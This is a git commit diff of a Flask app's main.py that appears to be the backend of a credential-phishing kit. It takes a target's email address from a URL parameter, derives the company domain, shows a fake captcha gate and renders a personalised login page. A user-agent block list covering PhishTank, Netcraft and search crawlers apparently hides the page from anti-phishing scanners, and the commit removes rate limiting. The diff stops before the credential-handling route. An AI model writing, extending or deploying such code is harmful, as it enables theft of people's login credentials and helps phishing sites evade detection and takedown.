3a91b992f52d3efee447b5791befb7a93b7bebde
susanagalan132 <susana.galan@epta-latarn.com>
2025-03-12 01:17:40 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,83 +1,85 @@
-from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+from flask import Flask, request, abort, render_template, session, \
+    redirect, url_for, jsonify
 import secrets
 import random
-from flask_limiter import Limiter
-from flask_limiter.util import get_remote_address
-import smtplib, ssl
+import smtplib
+import ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # made for education purposes only
 
 app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
 bot_user_agents = [
-'Googlebot', 
-'Baiduspider', 
-'ia_archiver',
-'R6_FeedFetcher', 
-'NetcraftSurveyAgent', 
-'Sogou web spider',
-'bingbot', 
-'Yahoo! Slurp', 
-'facebookexternalhit', 
-'PrintfulBot',
-'msnbot', 
-'Twitterbot', 
-'UnwindFetchor', 
-'urlresolver', 
-'Butterfly', 
-'TweetmemeBot',
-'PaperLiBot',
-'MJ12bot',
-'AhrefsBot',
-'Exabot',
-'Ezooms',
-'YandexBot',
-'SearchmetricsBot',
-'phishtank',
-'PhishTank',
-'picsearch',
-'TweetedTimes Bot',
-'QuerySeekerSpider',
-'ShowyouBot',
-'woriobot',
-'merlinkbot',
-'BazQuxBot',
-'Kraken',
-'SISTRIX Crawler',
-'R6_CommentReader',
-'magpie-crawler',
-'GrapeshotCrawler',
-'PercolateCrawler',
-'MaxPointCrawler',
-'R6_FeedFetcher',
-'NetSeer crawler',
-'grokkit-crawler',
-'SMXCrawler',
-'PulseCrawler',
-'Y!J-BRW',
-'80legs.com/webcrawler',
-'Mediapartners-Google', 
-'Spinn3r', 
-'InAGist', 
-'Python-urllib', 
-'NING', 
-'TencentTraveler',
-'Feedfetcher-Google', 
-'mon.itor.us', 
-'spbot', 
-'Feedly',
-'bot',
-'curl',
-"spider",
-"crawler"
-]
+    'Googlebot',
+    'Baiduspider',
+    'ia_archiver',
+    'R6_FeedFetcher',
+    'NetcraftSurveyAgent',
+    'Sogou web spider',
+    'bingbot',
+    'Yahoo! Slurp',
+    'facebookexternalhit',
+    'PrintfulBot',
+    'msnbot',
+    'Twitterbot',
+    'UnwindFetchor',
+    'urlresolver',
+    'Butterfly',
+    'TweetmemeBot',
+    'PaperLiBot',
+    'MJ12bot',
+    'AhrefsBot',
+    'Exabot',
+    'Ezooms',
+    'YandexBot',
+    'SearchmetricsBot',
+    'phishtank',
+    'PhishTank',
+    'picsearch',
+    'TweetedTimes Bot',
+    'QuerySeekerSpider',
+    'ShowyouBot',
+    'woriobot',
+    'merlinkbot',
+    'BazQuxBot',
+    'Kraken',
+    'SISTRIX Crawler',
+    'R6_CommentReader',
+    'magpie-crawler',
+    'GrapeshotCrawler',
+    'PercolateCrawler',
+    'MaxPointCrawler',
+    'R6_FeedFetcher',
+    'NetSeer crawler',
+    'grokkit-crawler',
+    'SMXCrawler',
+    'PulseCrawler',
+    'Y!J-BRW',
+    '80legs.com/webcrawler',
+    'Mediapartners-Google',
+    'Spinn3r',
+    'InAGist',
+    'Python-urllib',
+    'NING',
+    'TencentTraveler',
+    'Feedfetcher-Google',
+    'mon.itor.us',
+    'spbot',
+    'Feedly',
+    'bot',
+    'curl',
+    'spider',
+    'crawler',
+    ]
 
-@app.route('/m', methods=['GET', 'POST'])
+
+@app.route('/', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -85,35 +87,63 @@ def captcha():
         if 'passed_captcha' in session and session['passed_captcha']:
 
             # CAPTCHA has already been passed, redirect to success page
+
             return redirect(url_for('success'))
 
         # Generate a random 4-digit code
+
         code = random.randint(1000, 9999)
-        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
+        colors = [
+            '#FF4136',
+            '#0074D9',
+            '#2ECC40',
+            '#FFDC00',
+            '#FF851B',
+            '#B10DC9',
+            ]
         color = random.choice(colors)
         session['code'] = str(code)
-        userauto = request.args.get("web")
+        userauto = request.args.get('web')
         userdomain = userauto[userauto.index('@') + 1:]
         session['eman'] = userauto
         session['ins'] = userdomain
-        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
+        return render_template(
+            'captcha.html',
+            code=code,
+            color=color,
+            eman=userauto,
+            ins=userdomain,
+            error=False,
+            )
     elif request.method != 'GET':
 
         user_input = request.form['code']
 
         if user_input == session['code']:
-            
+
             # User input matches the code, set the flag and redirect to success page
+
             session['passed_captcha'] = True
             return redirect(url_for('success'))
         else:
+
             # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
+
             code = random.randint(1000, 9999)
-            colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
+            colors = [
+                '#FF4136',
+                '#0074D9',
+                '#2ECC40',
+                '#FFDC00',
+                '#FF851B',
+                '#B10DC9',
+                ]
             color = random.choice(colors)
             session['code'] = str(code)
 
-            return render_template('captcha.html', code=code, color=color, error=True)
+            return render_template('captcha.html', code=code,
+                                   color=color, error=True)
+
 
 @app.route('/success')
 def success():
@@ -124,13 +154,14 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/")
+@app.route('/m')
 def route2():
     web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param[web_param.index('@') + 1:]
-    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+    return render_template('index.html', eman=session.get('eman'),
+                           ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
